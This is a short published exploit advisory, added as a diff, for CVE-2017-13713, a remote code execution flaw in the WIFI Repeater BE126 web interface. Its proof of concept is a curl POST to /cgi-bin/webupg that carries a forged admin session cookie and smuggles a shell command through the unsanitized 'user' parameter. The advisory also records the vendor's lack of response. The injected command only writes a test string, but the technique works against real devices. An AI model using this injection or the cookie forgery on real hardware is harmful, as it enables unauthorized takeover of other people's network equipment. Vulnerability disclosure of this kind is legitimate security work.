@@ -1,0 +1,33 @@
+# Exploit Title:  WIFI Repeater BE126 – Remote Code Execution
+# Date Publish: 09/09/2017
+# Exploit Authors: Hay Mizrachi, Omer Kaspi
+
+# Contact: haymizrachi@gmail.com, komerk0@gmail.com
+# Vendor Homepage: http://www.twsz.com
+# Category: Webapps
+# Version: 1.0
+# Tested on: Windows/Ubuntu 16.04
+
+# CVE: CVE-2017-13713
+
+1 - Description:
+
+HTTP POST request that contains user parmater which can give us to run
+Remote Code Execution to the device.
+The parameter is not sanitized at all, which cause him to be vulnerable.
+
+
+2 - Proof of Concept:
+
+curl -d "name=HTTP&url="http://www.test.com&user=;echo hacked!! >
+/var/mycode;&password=a&port=8&dir=a"
+--cookie "Cookie: sessionsid=XXXXX; auth=ok expires=Sun, 15-May-2112
+01:45:46 GMT; langmanulset=yes;
+sys_UserName=admin; expires=Mon, 31-Jan-2112 16:00:00 GMT; language=en_us"
+-X POST http://beconnected.client/cgi-bin/webupg
+
+3 - Timeline:
+
+29/4/2017 – Vulnerability Discovered.
+29/4/2017 - Vendor not responding.
+03/09/2017 – Exploit published.
